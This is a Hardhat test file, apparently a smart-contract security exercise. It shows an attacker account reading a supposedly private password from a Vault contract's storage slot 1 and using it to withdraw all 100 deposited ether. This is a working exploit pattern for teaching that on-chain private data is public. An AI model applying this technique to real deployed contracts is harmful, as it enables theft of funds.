const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Vault", function () {
  let deployer, attacker;
  let pwd = "myPassword"
  beforeEach(async function () {
    [deployer, attacker] = await ethers.getSigners();

    const Vault = await ethers.getContractFactory("Vault", deployer);
    this.vault = await Vault.deploy(ethers.utils.formatBytes32String(pwd));
     
    await this.vault.deposit({ value: ethers.utils.parseEther("100") });
  });

  it("Should be possible to access to its private variables", async function () {
    const initialBalanceContract = await ethers.provider.getBalance(this.vault.address);
    const initialBalanceAttacker = await ethers.provider.getBalance(attacker.address);
    
    let retreivedPwd = await ethers.provider.getStorageAt(this.vault.address, 1);
    expect(ethers.utils.parseBytes32String(retreivedPwd)).to.equal(pwd)
    await this.vault.connect(attacker).withdraw(retreivedPwd);

    const finalBalanceContract = await ethers.provider.getBalance(this.vault.address);
    const finalBalanceAttacker = await ethers.provider.getBalance(attacker.address);
    
    expect(finalBalanceContract).to.eq(0);
    expect(finalBalanceAttacker).to.be.gt(initialBalanceAttacker);

  });
});
